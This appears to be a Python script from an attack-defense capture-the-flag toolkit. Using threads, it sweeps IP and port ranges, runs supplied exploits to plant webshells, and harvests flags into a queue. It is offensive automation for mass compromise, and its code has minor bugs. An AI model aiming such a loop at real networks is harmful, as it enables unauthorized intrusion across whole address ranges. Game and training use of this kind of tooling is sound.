from threading import Thread
import time
def run(cfg,exploits,webshells,flag_queue,log):
    def attack(web,ipsection):
        while True:
            for host in get_victim(ipsection):
                flag = ''
                if not webshells.get(host) and exploits.get(web):  #获取权限或flag
                    webshells[host] = []
                    for exploit in exploits.get(web):
                        shell,flag = exploit.attack(host)
                        if shell and shell.status():
                            log.debug('主机{}成功getshell-{}'.format(host,shell))
                            webshells[host].append(shell)   #权限获取成功
                            break
                
                if not flag and webshells.get(host):
                    for webshell in webshells[host]:
                        flag = webshell.getflag()
                        if flag:
                            flag_queue.put(flag)
                            log.debug('主机{}的flag获取成功-{}'.format(host,flag))
                            break
                else:
                    log.info('主机{}攻击失败'.format(host))
            time.sleep(3)
    T = [] #不同题目的攻击线程
    for web,ip_section in cfg['attack'].items():   #配置文件写入题目ip范围
        T.append(Thread(target=attack,args=(web,ip_section)))
    for t in T:
        log.info('题目{}攻击线程启动'.format(web))
        t.start()



def get_victim(ip_string): #123.123.1-255.123:1231 || 123.123.123.123:222-333
    ip , port = ip_string.split(':')
    ip = ip.split('.')
    parts = [*ip,port]  #
    for i in range(5):
        if '-' in parts[i]:
            start,end = parts[i].split('-')
            parts[i] = '{}'
            break
    host = '.'.join([*parts[:-1]])+':'+parts[-1]
    for i in range(int(start),int(end)+1):
        yield host.format(i)

